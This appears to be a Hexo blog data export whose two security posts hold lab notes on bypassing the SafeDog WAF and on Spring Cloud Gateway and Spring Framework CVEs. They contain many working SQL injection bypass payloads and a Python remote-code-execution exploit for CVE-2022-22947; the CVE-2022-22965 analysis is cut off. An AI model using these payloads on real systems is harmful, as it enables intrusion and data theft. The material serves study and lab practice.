{"meta":{"title":"popko's Blog","subtitle":"凸0w0凸","description":"ayaneSama&popko","author":"popko","url":"https://pipimi110.github.io"},"pages":[{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"bangumi/index.html","permalink":"https://pipimi110.github.io/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2021-04-19T11:39:21.431Z","comments":false,"path":"about/index.html","permalink":"https://pipimi110.github.io/about/index.html","excerpt":"","text":"[あやねさまのpopko]","keywords":"关于"},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"client/index.html","permalink":"https://pipimi110.github.io/client/index.html","excerpt":"","text":"直接下载 or 扫码下载：","keywords":"Android客户端"},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"comment/index.html","permalink":"https://pipimi110.github.io/comment/index.html","excerpt":"","text":"念两句诗 叙别梦、扬州一觉。 【宋代】吴文英《夜游宫·人去西楼雁杳》","keywords":"留言板"},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"donate/index.html","permalink":"https://pipimi110.github.io/donate/index.html","excerpt":"","text":"","keywords":"谢谢饲主了喵~"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"lab/index.html","permalink":"https://pipimi110.github.io/lab/index.html","excerpt":"","text":"sakura主题balabala","keywords":"Lab实验室"},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"links/index.html","permalink":"https://pipimi110.github.io/links/index.html","excerpt":"","text":"","keywords":"友人帐"},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"music/index.html","permalink":"https://pipimi110.github.io/music/index.html","excerpt":"","text":"","keywords":"喜欢的音乐"},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"rss/index.html","permalink":"https://pipimi110.github.io/rss/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"tags/index.html","permalink":"https://pipimi110.github.io/tags/index.html","excerpt":"","text":""},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"theme-sakura/index.html","permalink":"https://pipimi110.github.io/theme-sakura/index.html","excerpt":"","text":"Hexo主题Sakura修改自WordPress主题Sakura，感谢原作者Mashiro","keywords":"Hexo 主题 Sakura 🌸"},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"video/index.html","permalink":"https://pipimi110.github.io/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '放送时间: 2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} 番组计划 这里将是永远的回忆 window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} 放送时间: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"B站"}],"posts":[{"title":"waf绕过","slug":"waf绕过","date":"2022-04-05T12:22:06.724Z","updated":"2022-04-05T12:21:22.155Z","comments":true,"path":"2022/04/05/waf绕过/","link":"","permalink":"https://pipimi110.github.io/2022/04/05/waf%E7%BB%95%E8%BF%87/","excerpt":"","text":"waf绕过安全狗http://down.safedog.cn/download/software/safedogwz_Windows_Help.pdf 找不到apache服务名，插件安装失败 https://wxiaoge.blog.csdn.net/article/details/103912900?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=2 https://blog.csdn.net/weixin_48776804/article/details/113807682 管理员cmd cd C:\\tool\\phpstudy\\Apache\\bin 安装服务 httpd.exe -k install -n apache2.4 卸载服务 httpd.exe -k uninstall -n apache2.4 sc delete apache2.4 win+r services.msc//启动对应服务 安全狗需要使用新版本的phpstudy//而且需要卸载安全狗重装，才能安装插件成功 sql报错 Illegal mix of collations for operation ‘UNION’ https://blog.csdn.net/mengmeng2222222/article/details/97912270 https://blog.csdn.net/u013419759/article/details/82184713?spm=1001.2101.3001.6650.6&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-6.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-6.pc_relevant_default show create table users; DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci alter table users convert to character set utf8; DEFAULT CHARSET=utf8 union注入https://www.anquanke.com/post/id/263744 http://localhost/sqli-labs-master/Less-1/?id=1%27%20and%201=1--+ 绕过 1&#39; and 1--+ 1&#39; and ord(0x1)--+ 1&#39; and ord(0x0)--+ 绕过 order by 1 &#39;order/*/*/by+4--+ 绕过 union select // 1%27regexp+&quot;%23&quot;+union+%0A+select+1,2,3--+ 1%27regexp+&quot;%23&quot;+union+%0A+select+1,database(/*!1*/),3--+ 库 1%27regexp+&quot;%23&quot;+union+%0A+select+1,(select+group_concat(schema_name)from/*!/*%23*/%0Ainformation_schema.schemata*/),3--+ 表 1%27regexp+&quot;%23&quot;+union+%0A+select+1,(select+group_concat(table_name)from/*!/*%23*/%0Ainformation_schema.tables+where+table_schema=database()*/),3--+ 列 1%27regexp+&quot;%23&quot;+union+%0A+select+1,(select+group_concat(column_name)from/*!/*%23*/%0Ainformation_schema.columns+where+table_name=&#39;users&#39;*/),3--+ 数据 1%27regexp+&quot;%23&quot;+union+%0A+select+1,group_concat(username/*1*/),3+from+users--+ 1%27regexp+&quot;%23&quot;+union+%0A+select+1,(select+group_concat(username)from+users),3--+ 报错过滤updatexml(1,1,1) 1&#39;regexp+&quot;%23&quot;and+(updatexml%0a(1,concat(0x7e,(select+&#39;qwe&#39;)),1))--+ 1&#39;regexp+&quot;%23&quot;and+(updatexml%0a(1,concat(0x7e,(select+group_concat(username)from+users)),1))--+ 盲注绕过 if(1,1,0) 1&#39;and+(if(1,1,0))--+ 过滤 =&#39;a&#39; &gt;&lt;`like` 1&#39;and+(if(substr(&#39;abc&#39;,1,1)regexp&#39;^a$&#39;,1,0))--+ 布尔盲注 库 1&#39;and+(if(substr((select+group_concat(schema_name)from/*!/*%23*/%0Ainformation_schema.schemata*/),1,1)regexp&#39;^D$&#39;,1,0))--+ 表 1&#39;and+(if(substr((select+group_concat(table_name)from/*!/*%23*/%0Ainformation_schema.tables+where+table_schema=database()*/),1,1)regexp&#39;^D$&#39;,1,0))--+ 列 1&#39;and+(if(substr((select+group_concat(column_name)from/*!/*%23*/%0Ainformation_schema.columns+where+table_name=&#39;users&#39;*/),1,1)regexp&#39;^D$&#39;,1,0))--+ 数据 1&#39;and+(if(substr((select+group_concat(username)from+users),1,1)regexp&#39;^D$&#39;,1,0))--+ 时间盲注//第六个字符开始有效 select /*!123456789*/; +------+ | 6789 | +------+ | 6789 | +------+ 1&#39;and+(if(substr((select+group_concat(column_name)from/*!/*%23*/%0Ainformation_schema.columns+where+table_name=&#39;users&#39;*/),1,1)regexp&#39;^D$&#39;,1,sleep(/*!111113*/)))--+ tamper编写对应绕过tamper https://xz.aliyun.com/t/10479","categories":[{"name":"pentest","slug":"pentest","permalink":"https://pipimi110.github.io/categories/pentest/"}],"tags":[{"name":"waf","slug":"waf","permalink":"https://pipimi110.github.io/tags/waf/"}],"keywords":[{"name":"pentest","slug":"pentest","permalink":"https://pipimi110.github.io/categories/pentest/"}]},{"title":"spring-cve","slug":"spring-cve","date":"2022-04-04T18:14:33.960Z","updated":"2022-04-04T20:31:55.378Z","comments":true,"path":"2022/04/05/spring-cve/","link":"","permalink":"https://pipimi110.github.io/2022/04/05/spring-cve/","excerpt":"","text":"spring-cvelog4j 全局排除 https://blog.csdn.net/supingemail/article/details/112944282 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;*&lt;/groupId&gt; &lt;artifactId&gt;*&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt; &lt;/dependency&gt; CVE-2022-22947Spring Cloud Gateway SpEL表达式注入 在动态添加路由的过程中，某个filter可以对传入进来的值进行SpEL表达式解析，从而造成了远程代码执行漏洞 https://mp.weixin.qq.com/s/w3et7TzqZ4ctyybEWQ82HQ 影响范围： Spring Cloud Gateway 3.1.x &lt; 3.1.1 Spring Cloud Gateway &lt; 3.0.7 分析vulhub 利用 actuator 提供的路由添加功能 https://docs.spring.io/spring-cloud-gateway/docs/4.0.0-M1/reference/html/#recap-the-list-of-all-endpoints The folloiwng table below summarizes the Spring Cloud Gateway actuator endpoints (note that each endpoint has /actuator/gateway as the base-path): ID HTTP Method Description globalfilters GET Displays the list of global filters applied to the routes. routefilters GET Displays the list of GatewayFilter factories applied to a particular route. refresh POST Clears the routes cache. routes GET Displays the list of routes defined in the gateway. routes/&#123;id&#125; GET Displays information about a particular route. routes/&#123;id&#125; POST Adds a new route to the gateway. routes/&#123;id&#125; DELETE Removes an existing route from the gateway. /actuator/gateway/refresh /actuator/gateway/routefilters /actuator/gateway/globalfilters /actuator/gateway/routes #查看route_id /actuator/gateway/routes/&#123;route_id&#125; GET /actuator/gateway/routes/index HTTP/1.1 返回 {“predicate”:”Methods: [GET]”,”route_id”:”index”,”filters”:[],”uri”:”http://example.com:80&quot;,&quot;order&quot;:0} Path Type Description id String The route ID. predicates Array The collection of route predicates. Each item defines the name and the arguments of a given predicate. filters Array The collection of filters applied to the route. uri String The destination URI of the route. order Number The route order. 添加路由 //post格式参考从get获取的数据格式 https://docs.spring.io/spring-cloud-gateway/docs/4.0.0-M1/reference/html/#gateway-retrieving-information-about-a-particular-route 官方exam &#123; &quot;id&quot;: &quot;first_route&quot;, &quot;predicates&quot;: [&#123; &quot;name&quot;: &quot;Path&quot;, &quot;args&quot;: &#123;&quot;_genkey_0&quot;:&quot;/first&quot;&#125; &#125;], &quot;filters&quot;: [], &quot;uri&quot;: &quot;http://150.158.172.182:7777&quot;, &quot;order&quot;: 0 &#125; ssrf POST /actuator/gateway/routes/new_route HTTP/1.1 Host: 127.0.0.1:8080 Connection: close Content-Type: application/json &#123; &quot;predicate&quot;: &quot;Paths: [/new_route], match trailing slash: true&quot;, &quot;route_id&quot;: &quot;new_route&quot;, &quot;filters&quot;: [ &quot;[[RewritePath /new_route(?&lt;path&gt;.*) = /$&#123;path&#125;], order = 1]&quot; ], &quot;uri&quot;: &quot;https://www.cnpanda.net&quot;, &quot;order&quot;: 0 &#125; SSRF的payload中多了对过滤器（filters）的具体定义 expimport requests url = &quot;http://150.158.172.182:60005/&quot; def create(route_id,cmd): burp0_url = url+&quot;actuator/gateway/routes/&quot;+route_id burp0_json = &#123;&quot;filters&quot;: [&#123;&quot;args&quot;: &#123;&quot;name&quot;: &quot;Result&quot;, &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\\&quot;%s\\&quot;&#125;).getInputStream()))&#125;&quot;%cmd&#125;, &quot;name&quot;: &quot;AddResponseHeader&quot;&#125;], &quot;uri&quot;: &quot;http://150.158.172.182:7777/qqq&quot;&#125; r = requests.post(burp0_url, json=burp0_json) if r.status_code != 201: print(&quot;create fail&quot;) print(r.text) exit() def clean(route_id): burp0_url = url+&quot;actuator/gateway/routes/&quot;+route_id requests.delete(burp0_url) def fresh(): burp0_url = url+&quot;actuator/gateway/refresh&quot; requests.post(burp0_url) def show(): fresh() burp0_url = url+&quot;actuator/gateway/routes&quot; r=requests.get(burp0_url) print(r.text) route_id = &quot;hacktest&quot; cmd = &quot;whoami&quot; create(route_id,cmd) show() clean(route_id) show() 其他spring-cloud-gateway-server 模块 debug &lt;parent&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-build&lt;/artifactId&gt; &lt;!-- &lt;version&gt;4.0.0-SNAPSHOT&lt;/version&gt;--&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;relativePath/&gt; CVE-2022-22965http://blog.o0o.nu/2010/06/cve-2010-1622.html https://mp.weixin.qq.com/s/bG3BCdM-suCZldN7FIpYqw https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/ spring bean注入 public class Greeting &#123; private long id; private String content; public long getId() &#123; return id; &#125; public void setId(long id) &#123; this.id = id; &#125; @PostMapping(&quot;/greeting&quot;) public String greetingSubmit(@ModelAttribute Greeting greeting, Model model) &#123; return &quot;hello&quot;; &#125; id=1 greeting.getId() class.classloader...=xxx greeting.getClass().getClassloader()... 分析 InvocableHandlerMethod (org.springframework.web.method.support) args[i] = this.resolvers.resolveArgument(parameter, mavContainer, request, this.dataBinderFactory); HandlerMethodArgumentResolverComposite @Nullable public Object resolveArgument(MethodParameter parameter, @Nullable ModelAndViewContainer mavContainer, NativeWebRequest webRequest, @Nullable WebDataBinderFactory binderFactory) throws Exception &#123; HandlerMethodArgumentResolver resolver = this.getArgumentResolver(parameter); if (resolver == null) &#123; throw new IllegalArgumentException(&quot;Unsupported parameter type [&quot; + parameter.getParameterType().getName() + &quot;]. supportsParameter should be called first.&quot;); &#125; else &#123; return resolver.resolveArgument(parameter, mavContainer, webRequest, binderFactory); &#125; &#125; resolveArgument//bean注入ModelAttributeMethodProcessor public final Object resolveArgument(MethodParameter parameter, @Nullable ModelAndViewContainer mavContainer, NativeWebRequest webRequest, @Nullable WebDataBinderFactory binderFactory) throws Exception &#123; Assert.state(mavContainer != null, &quot;ModelAttributeMethodProcessor requires ModelAndViewContainer&quot;); Assert.state(binderFactory != null, &quot;ModelAttributeMethodProcessor requires WebDataBinderFactory&quot;); String name = ModelFactory.getNameForParameter(parameter); ModelAttribute ann = (ModelAttribute)parameter.getParameterAnnotation(ModelAttribute.class); if (ann != null) &#123; mavContainer.setBinding(name, ann.binding()); &#125; Object attribute = null; BindingResult bindingResult = null; if (mavContainer.containsAttribute(name)) &#123; attribute = mavContainer.getModel().get(name); &#125; else &#123; try &#123; attribute = this.createAttribute(name, parameter, binderFactory, webRequest);//1.createAttribute//类初始化 &#125; &#125; ... if (bindingResult == null) &#123; WebDataBinder binder = binderFactory.createBinder(webRequest, attribute, name);//2.createBinder//设置target if (binder.getTarget() != null) &#123; if (!mavContainer.isBindingDisabled(name)) &#123; this.bindRequestParameters(binder, webRequest);//3.bindRequestParameters//参数绑定 &#125; createAttribute//类初始化ServletModelAttributeMethodProcessor protected final Object createAttribute(String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory, NativeWebRequest request) throws Exception &#123; String value = this.getRequestValueForAttribute(attributeName, request); if (value != null) &#123;//null &#125; return super.createAttribute(attributeName, parameter, binderFactory, request); &#125; //ModelAttributeMethodProcessor protected Object createAttribute(String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory, NativeWebRequest webRequest) throws Exception &#123; MethodParameter nestedParameter = parameter.nestedIfOptional(); Class&lt;?&gt; clazz = nestedParameter.getNestedParameterType(); Constructor&lt;?&gt; ctor = BeanUtils.getResolvableConstructor(clazz);//构造函数 Object attribute = this.constructAttribute(ctor, attributeName, parameter, binderFactory, webRequest);//类初始化 if (parameter != nestedParameter) &#123; attribute = Optional.of(attribute); &#125; return attribute; &#125; protected Object constructAttribute(Constructor&lt;?&gt; ctor, String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory, NativeWebRequest webRequest) throws Exception &#123; if (ctor.getParameterCount() == 0) &#123;//无参构造函数 return BeanUtils.instantiateClass(ctor, new Object[0]); &#125; else &#123;//有参构造函数 ... BeanUtils public static &lt;T&gt; Constructor&lt;T&gt; getResolvableConstructor(Class&lt;T&gt; clazz) &#123; Constructor&lt;T&gt; ctor = findPrimaryConstructor(clazz); if (ctor != null) &#123; return ctor; &#125; else &#123; Constructor&lt;?&gt;[] ctors = clazz.getConstructors(); if (ctors.length == 1) &#123; return ctors[0];//返回构造函数 &#125; else &#123; if (ctors.length == 0) &#123; ctors = clazz.getDeclaredConstructors(); if (ctors.length == 1) &#123; return ctors[0]; &#125; &#125; try &#123; return clazz.getDeclaredConstructor();// ... &#125; &#125; &#125; &#125; public static &lt;T&gt; T instantiateClass(Constructor&lt;T&gt; ctor, Object... args) throws BeanInstantiationException &#123; Assert.notNull(ctor, &quot;Constructor must not be null&quot;); try &#123; ReflectionUtils.makeAccessible(ctor); if (KotlinDetector.isKotlinReflectPresent() &amp;&amp; KotlinDetector.isKotlinType(ctor.getDeclaringClass())) &#123; return BeanUtils.KotlinDelegate.instantiateClass(ctor, args); &#125; else &#123; Class&lt;?&gt;[] parameterTypes = ctor.getParameterTypes(); Assert.isTrue(args.length &lt;= parameterTypes.length, &quot;Can&#39;t specify more arguments than constructor parameters&quot;); Object[] argsWithDefaultValues = new Object[args.length]; for(int i = 0; i &lt; args.length; ++i) &#123; if (args[i] == null) &#123; Class&lt;?&gt; parameterType = parameterTypes[i]; argsWithDefaultValues[i] = parameterType.isPrimitive() ? DEFAULT_TYPE_VALUES.get(parameterType) : null; &#125; else &#123; argsWithDefaultValues[i] = args[i]; &#125; &#125; return ctor.newInstance(argsWithDefaultValues);//类初始化为对象 createBinder//设置targetDefaultDataBinderFactory public final WebDataBinder createBinder(NativeWebRequest webRequest, @Nullable Object target, String objectName) throws Exception &#123; WebDataBinder dataBinder = this.createBinderInstance(target, objectName, webRequest); protected WebDataBinder createBinderInstance(@Nullable Object target, String objectName, NativeWebRequest webRequest) throws Exception &#123; return new WebRequestDataBinder(target, objectName); &#125; public WebRequestDataBinder(@Nullable Object target, String objectName) &#123; super(target, objectName); &#125; public WebDataBinder(@Nullable Object target, String objectName) &#123; super(target, objectName); &#125; public DataBinder(@Nullable Object target, String objectName) &#123; this.directFieldAccess = false; this.ignoreUnknownFields = true; this.ignoreInvalidFields = false; this.autoGrowNestedPaths = true; this.autoGrowCollectionLimit = 256; this.bindingErrorProcessor = new DefaultBindingErrorProcessor(); this.validators = new ArrayList(); this.target = ObjectUtils.unwrapOptional(target);//设置target this.objectName = objectName; &#125; bindRequestParameters//参数绑定 ServletModelAttributeMethodProcessor protected void bindRequestParameters(WebDataBinder binder, NativeWebRequest request) &#123; ServletRequest servletRequest = (ServletRequest)request.getNativeRequest(ServletRequest.class); Assert.state(servletRequest != null, &quot;No ServletRequest&quot;); ServletRequestDataBinder servletBinder = (ServletRequestDataBinder)binder; servletBinder.bind(servletRequest);// &#125; ServletRequestDataBinder public void bind(ServletRequest request) &#123; MutablePropertyValues mpvs = new ServletRequestParameterPropertyValues(request); ... this.doBind(mpvs); &#125; protected void doBind(MutablePropertyValues mpvs) &#123; this.checkFieldDefaults(mpvs); this.checkFieldMarkers(mpvs); this.adaptEmptyArrayIndices(mpvs); super.doBind(mpvs);// &#125; //DataBinder protected void doBind(MutablePropertyValues mpvs) &#123; this.checkAllowedFields(mpvs); this.checkRequiredFields(mpvs); this.applyPropertyValues(mpvs);// &#125; protected void applyPropertyValues(MutablePropertyValues mpvs) &#123; try &#123; this.getPropertyAccessor().setPropertyValues(mpvs, this.isIgnoreUnknownFields(), this.isIgnoreInvalidFields());//this.getPropertyAccessor().setPropertyValues() getPropertyAccessorDataBinder protected ConfigurablePropertyAccessor getPropertyAccessor() &#123; return this.getInternalBindingResult().getPropertyAccessor(); &#125; protected AbstractPropertyBindingResult getInternalBindingResult() &#123; if (this.bindingResult == null) &#123; this.bindingResult = this.directFieldAccess ? this.createDirectFieldBindingResult() : this.createBeanPropertyBindingResult(); &#125; return this.bindingResult; &#125; protected AbstractPropertyBindingResult createBeanPropertyBindingResult() &#123; BeanPropertyBindingResult result = new BeanPropertyBindingResult(this.getTarget(), this.getObjectName(), this.isAutoGrowNestedPaths(), this.getAutoGrowCollectionLimit()); if (this.conversionService != null) &#123; result.initConversion(this.conversionService);//initConversion &#125; if (this.messageCodesResolver != null) &#123;//null ... &#125; return result; &#125; BeanPropertyBindingResult public void initConversion(ConversionService conversionService) &#123; Assert.notNull(conversionService, &quot;ConversionService must not be null&quot;); this.conversionService = conversionService; if (this.getTarget() != null) &#123; this.getPropertyAccessor().setConversionService(conversionService); &#125; &#125; public final ConfigurablePropertyAccessor getPropertyAccessor() &#123; if (this.beanWrapper == null) &#123; this.beanWrapper = this.createBeanWrapper();// ... &#125; return this.beanWrapper;//getPropertyAccessor() 返回 BeanWrapperImpl &#125; protected BeanWrapper createBeanWrapper() &#123; if (this.target == null) &#123; ... &#125; else &#123; return PropertyAccessorFactory.forBeanPropertyAccess(this.target);// &#125; &#125; PropertyAccessorFactory public static BeanWrapper forBeanPropertyAccess(Object target) &#123; return new BeanWrapperImpl(target); &#125; BeanWrapperImpl //target-&gt;wrappedObject public BeanWrapperImpl(Object object) &#123; super(object); &#125; //AbstractNestablePropertyAccessor protected AbstractNestablePropertyAccessor(Object object) &#123; ... this.setWrappedInstance(object); &#125; public void setWrappedInstance(Object object, @Nullable String nestedPath, @Nullable Object rootObject) &#123; this.wrappedObject = ObjectUtils.unwrapOptional(object);//target-&gt;wrappedObject setPropertyValuesBeanWrapperImpl public void setPropertyValues(PropertyValues pvs, boolean ignoreUnknown, boolean ignoreInvalid) throws BeansException &#123; List&lt;PropertyAccessException&gt; propertyAccessExceptions = null; List&lt;PropertyValue&gt; propertyValues = pvs instanceof MutablePropertyValues ? ((MutablePropertyValues)pvs).getPropertyValueList() : Arrays.asList(pvs.getPropertyValues());//MutablePropertyValues 多个键值对?还是multi post格式?感觉后者可能性更大 if (ignoreUnknown) &#123; this.suppressNotWritablePropertyException = true; &#125; try &#123; Iterator var6 = propertyValues.iterator(); while(var6.hasNext()) &#123; PropertyValue pv = (PropertyValue)var6.next(); try &#123; this.setPropertyValue(pv);//pvs遍历 public void setPropertyValue(PropertyValue pv) throws BeansException 